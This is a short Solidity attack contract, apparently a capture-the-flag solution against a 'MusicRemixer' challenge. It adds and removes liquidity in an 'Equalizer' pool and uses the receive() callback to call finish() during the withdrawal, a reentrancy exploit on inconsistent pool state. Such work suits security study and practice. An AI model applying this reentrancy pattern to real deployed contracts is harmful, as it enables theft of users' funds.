// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./MusicRemixer.sol";
import "forge-std/console2.sol";

contract MusicRemixerAttack {
    MusicRemixer remixer;
    Equalizer e;
    address[] bands;
    FreqBand token1;
    FreqBand token2;
    function setUp(address target, bytes memory sig) public payable {
        remixer = MusicRemixer(target);
        e = Equalizer(remixer.equalizer());
        remixer.getMaterial(sig);
        token1 = FreqBand(e.bands(1));
        token2 = FreqBand(e.bands(2));
        token1.approve(address(e), 1000 ether);
        token2.approve(address(e), 1000 ether);
    }

    function attack() public {
        // e.equalize{value: 0.1 ether}(0, 1, 0.1 ether);
        // e.equalize{value: 0.1 ether}(0, 2, 0.1 ether);
        // the getMaterial function could be useless

        uint[3] memory amounts = [uint(1 ether), uint(1 ether), uint(1 ether)];
        uint share = e.increaseVolume{value: 1 ether}(amounts);
        // e.getGlobalInfo();
        e.decreaseVolume(share);
        // e.getGlobalInfo();
    }

    receive() external payable {
        console2.log("Level:", remixer.getSongLevel());
        remixer.finish();
    }
}
